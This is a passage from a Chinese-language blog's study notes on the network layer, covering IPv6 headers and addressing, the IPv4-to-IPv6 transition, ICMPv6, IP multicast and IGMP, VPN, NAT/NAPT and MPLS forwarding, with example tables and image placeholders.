</p><p><strong>有效载荷长度(payload length)</strong>—— 16 位。它指明 IPv6 数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是 64 KB。 </p><p><strong>下一个首部(next header)</strong>—— 8 位。它相当于 IPv4 的协议字段或可选字段。 </p><p><strong>跳数限制(hop limit)</strong>—— 8 位。源站在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减 1。当跳数限制的值为零时，就要将此数据报丢弃。 </p><p><strong>源地址</strong>—— 128 位。是数据报的发送站的 IP 地址。 </p><p><strong>目的地址</strong>—— 128 位。是数据报的接收站的 IP 地址。 </p><p>IPv6 把原来 IPv4 首部中选项的功能都放在扩展首部中，并将扩展首部留给路径两端的源站和目的站的主机来处理。</p><p>数据报途中经过的路由器都不处理这些扩展首部（只有一个首部例外，即逐跳选项扩展首部）。这样就<strong>大大提高了路由器的处理效率</strong>。 </p><p>在 RFC 2460 中定义了六种扩展首部：</p><ol><li>逐跳选项</li><li>路由选择</li><li>分片</li><li>鉴别</li><li>封装安全有效载荷</li><li>目的站选项 </li></ol><h2 id="IPv6-的地址"><a href="#IPv6-的地址" class="headerlink" title="IPv6 的地址"></a>IPv6 的地址</h2><p>IPv6 数据报的目的地址可以是以下三种基本类型地址之一：</p><ol><li><strong>单播 (unicast)</strong>：传统的点对点通信。</li><li><strong>多播 (multicast)</strong>：一点对多点的通信。</li><li><strong>任播 (anycast)</strong>：这是 IPv6 增加的一种类型。任播的目的站是一组计算机，但数据报在交付时只交付其中的一个，通常是距离最近的一个。</li></ol><p>IPv6 将实现 IPv6 的主机和路由器均称为结点。一个结点就可能有多个与链路相连的接口。IPv6 地址是分配给结点上面的接口的。</p><ol><li>一个接口可以有多个单播地址。</li><li>其中的任何一个地址都可以当作到达该结点的目的地址。即一个结点接口的单播地址可用来唯一地标志该结点。</li></ol><p>为了使地址再稍简洁些，IPv6 使用冒号十六进制记法(colon hexadecimal notation, 简写为 colon hex)。每个 16 位的值用十六进制值表示，各值之间用冒号分隔。例如：68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF，在十六进制记法中，允许把数字前面的 0 省略。例如把 0000 中的前三个 0 省略，写成 1 个 0。</p><p>冒号十六进制记法可以允许<strong>零压缩 (zero compression)</strong>，即一连串连续的零可以为一对冒号所取代。</p><p>FF05:0:0:0:0:0:0:B3    可压缩为：<br>FF05::B3<br><strong>注意：在任一地址中只能使用一次零压缩。</strong></p><p>冒号十六进制记法可结合使用点分十进制记法的后缀，这种结合在 IPv4 向 IPv6 的转换阶段特别有用。</p><p>例如：0:0:0:0:0:0:128.10.2.1 再使用零压缩即可得出：  ::128.10.2.1</p><p><strong>CIDR 的斜线表示法仍然可用。</strong><br>例如：60 位的前缀 12AB00000000CD3 可记为：<br>    12AB:0000:0000:CD30:0000:0000:0000:0000/60<br>或 12AB::CD30:0:0:0:0/60 （零压缩）<br>或 12AB:0:0:CD30::/60 （零压缩）</p><p>IPv6地址分类</p><table><thead><tr><th>地址类型</th><th>二进制前缀</th></tr></thead><tbody><tr><td>未指明地址</td><td>00…0（128位），可记为 ::/128。</td></tr><tr><td>环回地址</td><td>00…1（128位），可记为 ::1/128。</td></tr><tr><td>多播地址</td><td>11111111（8位），可记为 FF00::/8。</td></tr><tr><td>本地链路单播地址</td><td>1111111010（10位）,  可记为 FE80::/10。</td></tr><tr><td>全球单播地址</td><td>（除上述四种外，所有其他的二进制前缀）</td></tr></tbody></table><p><strong>未指明地址</strong>：这是 16 字节的全 0 地址，可缩写为两个冒号“::”。这个地址只能为还没有配置到一个标准的 IP 地址的主机当作源地址使用。这类地址仅此一个。</p><p><strong>环回地址：</strong>即 0:0:0:0:0:0:0:1（记为 ::1）。作用和 IPv4 的环回地址一样。这类地址也是仅此一个。</p><p><strong>多播地址：</strong>功能和 IPv4 的一样。这类地址占 IPv6 地址总数的 1/256。</p><p><strong>本地链路单播地址 (Link-Local Unicast Address)</strong> ：有些单位的网络使用 TCP/IP 协议，但并没有连接到互联网上。连接在这样的网络上的主机都可以使用这种本地地址进行通信，但不能和互联网上的其他主机通信。这类地址占 IPv6 地址总数的 1/1024。（也就是<strong>专用网</strong>，[虚拟专用网 VPN](#虚拟专用网 VPN)会聊到这部分）</p><p><strong>全球单播地址</strong><br>IPv6 的这一类单播地址是使用得最多的一类。<br>曾提出过多种方案来进一步划分这 128 位的单播地址。<br>根据 2006 年发布的草案标准 RFC 4291 的建议，  IPv6 单播地址的划分方法非常灵活。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163300216.png" alt="image-20210416163300216"></p><h2 id="从-IPv4-向-IPv6-过渡"><a href="#从-IPv4-向-IPv6-过渡" class="headerlink" title="从 IPv4 向 IPv6 过渡"></a>从 IPv4 向 IPv6 过渡</h2><p>向 IPv6 过渡只能采用逐步演进的办法，同时，还必须使新安装的 IPv6 系统能够向后兼容：IPv6 系统必须能够接收和转发 IPv4 分组，并且能够为 IPv4 分组选择路由。两种向 IPv6 过渡的策略：</p><ol><li><strong>使用双协议栈</strong></li><li><strong>使用隧道技术</strong></li></ol><h3 id="双协议栈"><a href="#双协议栈" class="headerlink" title="双协议栈"></a>双协议栈</h3><p>双协议栈 (dual stack) 是指在完全过渡到 IPv6 之前，使一部分主机（或路由器）装有两个协议栈，一个 IPv4 和一个 IPv6。</p><p>双协议栈的主机（或路由器）记为 IPv6/IPv4，表明它同时具有两种 IP 地址：一个 IPv6 地址和一个 IPv4 地址。</p><p>双协议栈主机在和 IPv6 主机通信时是采用 IPv6 地址，而和 IPv4 主机通信时就采用 IPv4 地址。</p><p>根据 DNS 返回的地址类型可以确定使用 IPv4 地址还是 IPv6 地址。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163413506.png" alt="image-20210416163413506"></p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><p>在 IPv6 数据报要进入 IPv4 网络时，把 IPv6 数据报封装成为 IPv4 数据报，整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。当 IPv4 数据报离开 IPv4 网络中的隧道时，再把数据部分（即原来的 IPv6 数据报）交给主机的 IPv6 协议栈。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163442462.png" alt="image-20210416163442462"></p><h2 id="ICMPv6"><a href="#ICMPv6" class="headerlink" title="ICMPv6"></a>ICMPv6</h2><p>IPv6 也不保证数据报的可靠交付，因为互联网中的路由器可能会丢弃数据报。</p><p>因此 IPv6 也需要使用 <strong>ICMP</strong> 来反馈一些差错信息。新的版本称为 ICMPv6。</p><p><strong>地址解析协议 ARP 和网际组管理协议 IGMP 协议的功能都已被合并到 ICMPv6 中。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163550279.png" alt="image-20210416163550279"></p><p>CMPv6 是面向报文的协议，它利用报文来报告差错，获取信息，探测邻站或管理多播通信。</p><p>ICMPv6 还增加了几个定义报文的功能及含义的其他协议。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163605022.png" alt="image-20210416163605022"></p><h1 id="IP-多播"><a href="#IP-多播" class="headerlink" title="IP 多播"></a>IP 多播</h1><h2 id="IP-多播的基本概念"><a href="#IP-多播的基本概念" class="headerlink" title="IP 多播的基本概念"></a>IP 多播的基本概念</h2><p>IP 多播 (multicast，以前曾译为组播) 已成为互联网的一个热门课题。</p><blockquote><p>在互联网上进行多播就叫做 IP 多播。<br>互联网范围的多播要靠路由器来实现。<br>能够运行多播协议的路由器称为<strong>多播路由器(multicast router)</strong>。当然它<strong>也可以转发普通的单播IP数据报</strong>。</p></blockquote><p><strong>目的：更好地支持一对多通信。</strong></p><p><strong>一对多通信：一个源点发送到许多个终点</strong>。</p><p>例如，实时信息的交付（如新闻、股市行情等），<strong>软件更新</strong>，<strong>交互式会议</strong>及其他多媒体通信。</p><p>采用单播方式，向 90 台主机传送，同样的视频节目需要发送 90 个单播，如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163820605.png" alt="image-20210416163820605"></p><p>采用多播方式，只需发送一次到多播组。<strong>路由器复制分组</strong>。<strong>局域网具有硬件多播功能</strong>，不需要复制分组。</p><p>这样的好处是：当多播组的主机数很大时（如成千上万个），采用多播方式就可明显地减轻网络中各种资源的消耗。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416163835811.png" alt="image-20210416163835811"></p><h3 id="多播-IP-地址"><a href="#多播-IP-地址" class="headerlink" title="多播 IP 地址"></a>多播 IP 地址</h3><ul><li>IP 多播所传送的分组需要使用多播 IP 地址。</li><li>在多播数据报的目的地址写入的是<strong>多播组的标识符</strong>。</li><li>多播组的标识符就是 <strong>IP 地址中的 D 类地址</strong>（多播地址，前面有提到过——[ip地址的分类](#分类的 IP 地址)）。</li><li><strong>每一个 D 类地址标志一个多播组</strong>。</li><li><strong>多播地址只能用于目的地址</strong>，不能用于源地址。</li></ul><h3 id="多播数据报"><a href="#多播数据报" class="headerlink" title="多播数据报"></a>多播数据报</h3><p>多播数据报和一般的 IP 数据报的区别就是它使用 D 类 IP 地址作为目的地址，并且首部中的<strong>协议字段值是 2，表明使用网际组管理协议 IGMP</strong>。</p><p>多播数据报也是<strong>“尽最大努力交付”</strong>，不保证一定能够交付多播组内的所有成员。</p><p>对<strong>多播数据报不产生 ICMP 差错报文</strong>。因此，若在 PING 命令后面键入多播地址，将永远不会收到响应。</p><h2 id="在局域网上进行硬件多播"><a href="#在局域网上进行硬件多播" class="headerlink" title="在局域网上进行硬件多播"></a>在局域网上进行硬件多播</h2><p>互联网号码指派管理局 IANA 拥有的以太网地址块的高 24 位为 00-00-5E。因此 TCP/IP 协议使用的以太网地址块的范围是<strong>从   00-00-5E-00-00-00 到   00-00-5E-7F-FF-FF</strong> ，不难看出（挺难看出的），在每一个地址中，只有23位可用作多播。D 类 IP 地址可供分配的有 28 位，在这 28 位中的前 5 位不能用来构成以太网硬件地址。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416164552924.png" alt="image-20210416164552924"></p><p>由于多播 IP 地址与以太网硬件地址的映射关系不是唯一的，因此收到多播数据报的主机，<strong>还要在 IP 层利用软件进行过滤，</strong>把不是本主机要接收的数据报丢弃。</p><h2 id="网际组管理协议-IGMP-和多播路由选择协议"><a href="#网际组管理协议-IGMP-和多播路由选择协议" class="headerlink" title="网际组管理协议 IGMP 和多播路由选择协议"></a>网际组管理协议 IGMP 和多播路由选择协议</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>为了使路由器知道多播组成员的信息，需要利用<strong>网际组管理协议 IGMP (Internet Group Management Protocol)</strong>。</p><p>连接在局域网上的多播路由器还必须和互联网上的其他多播路由器协同工作，以便把多播数据报用最小代价传送给所有的组成员。这就需要使用<strong>多播路由选择协议</strong>。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416165016871.png" alt="image-20210416165016871"></p><p>IGMP 并非在互联网范围内对所有多播组成员进行管理的协议。IGMP 不知道 IP 多播组包含的成员数，也不知道这些成员都分布在哪些网络上<strong>。IGMP 协议是让连接在本地局域网上的多播路由器知道本局域网上是否有主机（严格讲，是主机上的某个进程）参加或退出了某个多播组。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416165127191.png" alt="image-20210416165127191"></p><p>多播转发必须动态地适应多播组成员的变化（这时网络拓扑并未发生变化）。请注意，单播路由选择通常是在网络拓扑发生变化时才需要更新路由。</p><p>多播路由器在转发多播数据报时，不能仅仅根据多播数据报中的目的地址，而是还要考虑这个<strong>多播数据报从什么地方来和要到什么地方去。</strong> </p><p>多播数据报<strong>可以由没有加入多播组的主机发出，也可以通过没有组成员接入的网络。</strong> </p><h3 id="网际组管理协议-IGMP"><a href="#网际组管理协议-IGMP" class="headerlink" title="网际组管理协议 IGMP"></a>网际组管理协议 IGMP</h3><p>和 ICMP 相似，<strong>IGMP 使用 IP 数据报传递其报文</strong>（即 IGMP 报文加上 IP 首部构成 IP 数据报），但它也向 IP 提供服务。因此，我们不把 IGMP 看成是一个单独的协议，而是属于整个网际协议 IP 的一个组成部分。 </p><h4 id="第一阶段：加入多播组"><a href="#第一阶段：加入多播组" class="headerlink" title="第一阶段：加入多播组"></a>第一阶段：加入多播组</h4><p>当某个主机加入新的多播组时，该主机应向多播组的多播地址发送 IGMP 报文，声明自己要成为该组的成员。本地的多播路由器收到 IGMP 报文后，将组成员关系转发给互联网上的其他多播路由器。</p><h4 id="第二阶段：探询组成员变化情况"><a href="#第二阶段：探询组成员变化情况" class="headerlink" title="第二阶段：探询组成员变化情况"></a>第二阶段：探询组成员变化情况</h4><p>因为组成员关系是动态的，因此本地多播路由器要周期性地探询本地局域网上的主机，以便知道这些主机是否还继续是组的成员。</p><p>只要对某个组有一个主机响应，那么多播路由器就认为这个组是活跃的。但一个组在经过几次的探询后仍然没有一个主机响应，则不再将该组的成员关系转发给其他的多播路由器。</p><p><strong>在主机和多播路由器之间的所有通信都是使用 IP 多播。</strong></p><p>多播路由器在探询组成员关系时，只需要对所有的组发送一个请求信息的询问报文，而不需要对每一个组发送一个询问报文。默认的询问速率是每 125 秒发送一次。</p><p>当同一个网络上连接有几个多播路由器时，它们能够迅速和有效地选择其中的一个来探询主机的成员关系。 </p><p>在 IGMP 的询问报文中有一个数值 N，它指明一个最长响应时间（默认值为 10 秒）。当收到询问时，主机在 0 到 N 之间随机选择发送响应所需经过的时延。对应于最小时延的响应最先发送。</p><p>同一个组内的每一个主机都要监听响应，只要有本组的其他主机先发送了响应，自己就可以不再发送响应了。 </p><h3 id="多播路由选择"><a href="#多播路由选择" class="headerlink" title="多播路由选择"></a>多播路由选择</h3><p>多播路由选择协议尚未标准化。一个多播组中的成员是动态变化的，随时会有主机加入或离开这个多播组。</p><p><strong>多播路由选择实际上就是要找出以源主机为根结点的多播转发树。</strong></p><p>在多播转发树上的路由器不会收到重复的多播数据报。对不同的多播组对应于不同的多播转发树。同一个多播组，对不同的源点也会有不同的多播转发树。</p><p>多播路由选择协议在转发多播数据报时使用三种方法：</p><ol><li>洪泛与剪除</li><li>隧道技术 (tunneling)</li><li>基于核心的发现技术 </li></ol><h4 id="洪泛与剪除"><a href="#洪泛与剪除" class="headerlink" title="洪泛与剪除"></a>洪泛与剪除</h4><p>这种方法适合于较小的多播组，而所有的组成员接入的局域网也是相邻接的。</p><p>一开始，路由器转发多播数据报使用洪泛的方法（这就是<strong>广播</strong>）。<br>为了避免兜圈子，采用了叫做<strong>反向路径广播 RPB</strong> (Reverse Path Broadcasting) 的策略。 </p><p>什么是RPB</p><blockquote><p>路由器收到多播数据报时，先检查它是否是从源点经最短路径传送来的。若是，就向所有其他方向转发刚才收到的多播数据报（但进入的方向除外），否则就丢弃而不转发。</p><p>如果存在几条同样长度的最短路径，那么只能选择一条最短路径，选择的准则就是看这几条最短路径中的相邻路由器谁的 IP 地址最小。 </p><p>最后就得出了用来转发多播数据报的多播转发树，以后就按这个多播转发树转发多播数据报。避免了多播数据报的兜圈子，同时每一个路由器也不会接收重复的多播数据报。</p></blockquote><p>要点</p><ul><li>如果在多播转发树上的某个路由器发现它的下游树枝（即叶节点方向）已没有该多播组的成员，就应把它和下游的树枝一起剪除。</li><li>当某个树枝有新增加的组成员时，可以再接入到多播转发树上。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416171012381.png" alt="image-20210416171012381"></p><h4 id="隧道技术-tunneling"><a href="#隧道技术-tunneling" class="headerlink" title="隧道技术 (tunneling)"></a>隧道技术 (tunneling)</h4><p>隧道技术适用于<strong>多播组的位置在地理上很分散</strong>的情况。</p><p>简单地说就是讲多播数据报进行封装成单播数据包，然后在不支持多播的网络上传递，如下图所示</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416171052103.png" alt="image-20210416171052103"></p><h4 id="基于核心的发现技术"><a href="#基于核心的发现技术" class="headerlink" title="基于核心的发现技术"></a>基于核心的发现技术</h4><p>这种方法对于多播组的大小在较大范围内变化时都适合。这种方法是<strong>对每一个多播组 G 指定一个核心(core) 路由器，给出它的 IP 单播地址。</strong>核心路由器按照前面讲过的方法创建出对应于多播组 G 的转发树。</p><p>没了，就这样 </p><h1 id="虚拟专用网-VPN-和网络地址转换-NAT"><a href="#虚拟专用网-VPN-和网络地址转换-NAT" class="headerlink" title="虚拟专用网 VPN 和网络地址转换 NAT"></a>虚拟专用网 VPN 和网络地址转换 NAT</h1><h2 id="虚拟专用网-VPN"><a href="#虚拟专用网-VPN" class="headerlink" title="虚拟专用网 VPN"></a>虚拟专用网 VPN</h2><p>由于 IP 地址的紧缺，一个机构能够申请到的IP地址数往往远小于本机构所拥有的主机数。考虑到互联网并不很安全，一个机构内也并不需要把所有的主机接入到外部的互联网。假定在一个机构内部的计算机通信也是采用 TCP/IP 协议，那么从原则上讲，对于这些仅在机构内部使用的计算机就可以由本机构自行分配其 IP 地址。</p><p>所以地址被分成了两种——本地地址与全球地址</p><p><strong>本地地址</strong>——仅在机构内部使用的 IP 地址，可以由本机构自行分配，而不需要向互联网的管理机构申请。</p><p><strong>全球地址</strong>——全球唯一的 IP 地址，必须向互联网的管理机构申请。 </p><p>但是在内部使用的本地地址就有可能和互联网中某个 IP 地址重合，这样就会出现地址的二义性问题。</p><p>解决方法：RFC 1918 指明了一些专用地址 (private address)。专用地址只能用作本地地址而不能用作全球地址。在互联网中的所有路由器，对目的地址是专用地址的数据报一律不进行转发</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416172336933.png" alt="image-20210416172336933"></p><p>采用这样的专用 IP 地址的互连网络称为<strong>专用互联网</strong>或<strong>本地互联网</strong>，或更简单些，就叫做<strong>专用网</strong>。<br>因为这些专用地址仅在本机构内部使用。<strong>专用IP地址也叫做可重用地址 (reusable address)</strong>。</p><blockquote><p>利用公用的互联网作为本机构各专用网之间的通信载体，这样的专用网又称为虚拟专用网VPN (Virtual Private Network)。</p></blockquote><p>“专用网”是因为这种网络是为本机构的主机用于机构内部的通信，而不是用于和网络外非本机构的主机通信。“虚拟”表示“好像是”，但实际上并不是，因为现在并没有真正使用通信专线，而VPN只是在效果上和真正的专用网一样。</p><p>如果专用网不同网点之间的通信必须经过公用的互联网，但又有保密的要求，那么所有通过互联网传送的数据都必须加密。一个机构要构建自己的 VPN 就必须为它的每一个场所购买专门的硬件和软件，并进行配置，使每一个场所的 VPN 系统都知道其他场所的地址。</p><p>用隧道技术实现虚拟专用网（如下图）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416172632581.png" alt="image-20210416172632581"></p><p>具体看看隧道技术如何实现</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416172718117.png" alt="image-20210416172718117"><br>由部门 A 和 B 的内部网络所构成的虚拟专用网 VPN 又称为内联网 (intranet)，表示部门 A 和 B 都是在同一个机构的内部。一个机构和某些外部机构共同建立的虚拟专用网 VPN 又称为外联网 (extranet)。 它们都是基于 TCP/IP 协议的。</p><h3 id="远程接入-VPN"><a href="#远程接入-VPN" class="headerlink" title="远程接入 VPN"></a>远程接入 VPN</h3><p>远程接入 VPN (remote access VPN)可以满足外部流动员工访问公司网络的需求。</p><p>在外地工作的员工拨号接入互联网，而驻留在员工 PC 机中的 VPN 软件可在员工的 PC 机和公司的主机之间建立 VPN 隧道，因而外地员工与公司通信的内容是保密的，员工们感到好像就是使用公司内部的本地网络。 </p><h2 id="网络地址转换-NAT"><a href="#网络地址转换-NAT" class="headerlink" title="网络地址转换 NAT"></a>网络地址转换 NAT</h2><p>如何在专用网上使用专用地址的主机与互联网上的主机通信</p><p>想象一下，咱们用的校园网，如果细心点的话你会发现它就是一个本地互联网，而如果你连上了校园网wifi，不通过登录你是可以访问得到校园网里面的某些网址的，也就是内部互相访问，但是一旦你需要上个百度啥的，你就需要登录自己的校园网账号，那这是怎么做到滴呢，这个问题就和上面那个问题一致</p><p>有两种方法</p><ol><li>再申请一些全球 IP 地址。但这在很多情况下是不容易做到的。</li><li>采用网络地址转换 NAT。这是目前使用得最多的方法。</li></ol><h3 id="NAT使用前提"><a href="#NAT使用前提" class="headerlink" title="NAT使用前提"></a>NAT使用前提</h3><p>需要在专用网连接到互联网的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT路由器，它至少有一个有效的外部全球IP地址。<br>所有使用本地地址的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和互联网连接。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416173906968.png" alt="image-20210416173906968"></p><ol><li>内部主机 A 用本地地址 IPA 和互联网上主机 B 通信所发送的数据报必须经过 NAT 路由器。</li><li>NAT 路由器将数据报的<strong>源地址 IPA 转换成全球地址 IPG</strong> ，并把转换结果记录到NAT地址转换表中，目的地址 IPB 保持不变，然后发送到互联网。</li><li>NAT 路由器收到主机 B 发回的数据报时，知道数据报中的源地址是  IPB  而目的地址是 <strong>IPG</strong>  。</li><li>根据 NAT 转换表，NAT 路由器将目的地址 IPG 转换为 IPA ，转发给最终的内部主机 A。 </li></ol><p>可以看出，在内部主机与外部主机通信时，在NAT路由器上发生了两次地址转换：离开专用网时：替换源地址，将内部地址替换为全球地址；进入专用网时：替换目的地址，将全球地址替换为内部地址；</p><table><thead><tr><th>方向</th><th>字段</th><th>旧的IP地址</th><th>新的IP地址</th></tr></thead><tbody><tr><td>出</td><td>源IP地址</td><td>192.168.0.3</td><td>172.38.1.5</td></tr><tr><td>入</td><td>目的IP地址</td><td>172.38.1.5</td><td>192.168.0.3</td></tr><tr><td>出</td><td>源IP地址</td><td>192.168.0.7</td><td>172.38.1.6</td></tr><tr><td>入</td><td>目的IP地址</td><td>172.38.1.6</td><td>192.168.0.7</td></tr></tbody></table><p>当 NAT 路由器具有 <strong>n 个全球 IP 地址时</strong>，专用网内<strong>最多可以同时有 n 台主机接入到互联网</strong>。这样就可以使专用网内较多数量的主机，轮流使用 NAT 路由器有限数量的全球 IP 地址。</p><p><strong>通过 NAT 路由器的通信必须由专用网内的主机发起。专用网内部的主机不能充当服务器用，因为互联网上的客户无法请求专用网内的服务器提供服务。</strong></p><h3 id="网络地址与端口号转换-NAPT"><a href="#网络地址与端口号转换-NAPT" class="headerlink" title="网络地址与端口号转换 NAPT"></a>网络地址与端口号转换 NAPT</h3><p>为了更加有效地利用 NAT 路由器上的全球IP地址，现在常用的 NAT 转换表把运输层的端口号也利用上。这样，就可以使多个拥有本地地址的主机，<strong>共用一个 NAT 路由器上的全球 IP 地址</strong>，因而可以同时和互联网上的不同主机进行通信。</p><p><strong>使用端口号的 NAT 叫做网络地址与端口号转换NAPT (Network Address and Port Translation)</strong>，而不使用端口号的 NAT 就叫做传统的 NAT (traditional NAT)。</p><p>举个栗子，如下表所示，讲专用网内的ip地址进行转换</p><table><thead><tr><th>方向</th><th>字段</th><th>旧的IP地址和端口号</th><th>新的IP地址和端口号</th></tr></thead><tbody><tr><td>出</td><td>源IP地址:TCP源端口</td><td>192.168.0.3:30000</td><td>172.38.1.5:40001</td></tr><tr><td>出</td><td>源IP地址:TCP源端口</td><td>192.168.0.4:30000</td><td>172.38.1.5:40002</td></tr><tr><td>入</td><td>目的IP地址:TCP目的端口</td><td>172.38.1.5:40001</td><td>192.168.0.3:30000</td></tr><tr><td>入</td><td>目的IP地址:TCP目的端口</td><td>172.38.1.5:40002</td><td>192.168.0.4:30000</td></tr></tbody></table><p>NAPT把专用网内不同的源 IP 地址，都转换为同样的全球 IP 地址。但对源主机所采用的 TCP 端口号（不管相同或不同），则转换为不同的新的端口号。因此，当 NAPT 路由器收到从互联网发来的应答时，就可以从 IP 数据报的数据部分找出运输层的端口号，然后根据不同的目的端口号，从 NAPT 转换表中找到正确的目的主机。</p><h1 id="多协议标记交换-MPLS"><a href="#多协议标记交换-MPLS" class="headerlink" title="多协议标记交换 MPLS"></a>多协议标记交换 MPLS</h1><p><strong>“多协议”</strong>表示在 MPLS 的上层可以采用多种协议，例如：IP，IPX；可以使用多种数据链路层协议，例如：PPP，以太网，ATM 等。<strong>“标记”</strong>是指每个分组被打上一个标记，根据该标记对分组进行转发。</p><p>为了实现交换，可以利用面向连接的概念，使每个分组携带一个叫做标记 (label) 的小整数。当分组到达交换机（即标记交换路由器）时，交换机读取分组的标记，并用标记值来检索分组转发表。 这样就比查找路由表来转发分组要快得多（下面会详细讲述其差别）。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416181924069.png" alt="image-20210416181924069"></p><p><strong>MPLS 的特点</strong></p><p>MPLS 并没有取代 IP，而是作为一种 IP 增强技术，被广泛地应用在互联网中。</p><p>MPLS 具有以下三个方面的特点：</p><ol><li>支持面向连接的服务质量；</li><li>支持流量工程，平衡网络负载；</li><li>有效地支持虚拟专用网 VPN。</li></ol><h2 id="MPLS-的工作原理"><a href="#MPLS-的工作原理" class="headerlink" title="MPLS 的工作原理"></a>MPLS 的工作原理</h2><h3 id="基本工作过程"><a href="#基本工作过程" class="headerlink" title="基本工作过程"></a>基本工作过程</h3><p>首先来看看传统的IP 分组的转发</p><p>(1) 在传统的 IP 网络中，分组每到达一个路由器后，都必须提取出其目的地址，按目的地址查找路由表，并按照“最长前缀匹配”的原则找到下一跳的 IP 地址（请注意，前缀的长度是不确定的）。</p><p>(2) 当网络很大时，查找含有大量项目的路由表要花费很多的时间。</p><p>(3) 在出现突发性的通信量时，往往还会使缓存溢出，这就会引起分组丢失、传输时延增大和服务质量下降。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416182509873.png" alt="image-20210416182509873"></p><p>而MPLS 协议的基本原理如下</p><p>在 <strong>MPLS 域的入口处</strong>，<strong>给每一个 IP 数据报打上固定长度“标记”</strong>，然后对打上标记的 IP 数据报用<strong>硬件</strong>进行<strong>转发</strong>。</p><p>采用硬件技术对打上标记的 IP 数据报进行转发就称为<strong>标记交换</strong>。</p><p>“交换”也表示在转发时<strong>不再上升到第三层查找转发表，而是根据标记在第二层（链路层）用硬件进行转发</strong>。</p><p><strong>MPLS 域 (MPLS domain)</strong> 是指该域中有许多彼此相邻的路由器，并且所有的路由器都是支持 MPLS 技术的标记交换路由器 LSR (Label Switching Router)。</p><p>LSR 同时具有标记交换和路由选择这两种功能，标记交换功能是为了快速转发，<strong>但在这之前LSR 需要使用路由选择功能构造转发表</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416182738831.png" alt="image-20210416182738831"></p><h2 id="MPLS-的基本工作过程"><a href="#MPLS-的基本工作过程" class="headerlink" title="MPLS 的基本工作过程"></a>MPLS 的基本工作过程</h2><p>(1)  MPLS 域中的各 LSR 使用专门的<strong>标记分配协议 LDP</strong> 交换报文，并找出<strong>标记交换路径 LSP</strong>。各 LSR 根据这些路径<strong>构造出分组转发表</strong>。 </p><p>(2)  分组进入到 MPLS 域时， MPLS <strong>入口结点把分组打上标记</strong>，并按照转发表将分组转发给下一个 LSR。给 IP 数据报打标记的过程叫做<strong>分类 (classification)</strong>。</p><p>(3) 一个标记仅仅在两个标记交换路由器 LSR 之间才有意义。分组每经过一个 LSR，<strong>LSR 就要做两件事</strong>：<strong>一是转发</strong>，<strong>二是更换新的标记</strong>，即把入标记更换成为出标记。这就叫做标记对换 (label swapping)。</p><p>下面是转发表的一个举例</p><table><thead><tr><th>入接口</th><th>入标记</th><th>出接口</th><th>出标记</th></tr></thead><tbody><tr><td>0</td><td>3</td><td>1</td><td>1</td></tr></tbody></table><p>该表的含义是含义：从入接口 0 收到一个入标记为 3 的IP 数据报，转发时，应当把该IP数据报从出接口 1 转发出去，同时把标记对换为 1。</p><p>(4) 当分组离开 MPLS 域时，MPLS 出口结点把分组的标记去除。再以后就按照一般分组的转发方法进行转发。</p><blockquote><p>上述的这种“由入口 LSR 确定进入 MPLS 域以后的转发路径”称为<strong>显式路由选择 (explicit routing)</strong>，它和互联网中通常使用的“<strong>每一个路由器逐跳进行路由选择</strong>”有着很大的区别。</p></blockquote><h2 id="转发等价类-FEC"><a href="#转发等价类-FEC" class="headerlink" title="转发等价类 FEC"></a>转发等价类 FEC</h2><p>MPLS 有个很重要的概念就是<strong>转发等价类 FEC</strong> (Forwarding Equivalence Class)。“转发等价类”就是<strong>路由器按照同样方式对待的分组的集合</strong>。 </p><blockquote><p>“按照同样方式对待”表示：从同样接口转发到同样的下一跳地址，并且具有同样服务类别和同样丢弃优先级等。</p></blockquote><p>划分 FEC 的方法不受什么限制，这都由网络管理员来控制，因此非常灵活。</p><p>入口结点并不是给每一个分组指派一个不同的标记，而是将属于同样 FEC 的分组都指派同样的标记。</p><p>FEC 和标记是一一对应的关系。</p><p>这样，就可以把它用于<strong>负载平衡</strong>啦，如下图流量工程</p><h3 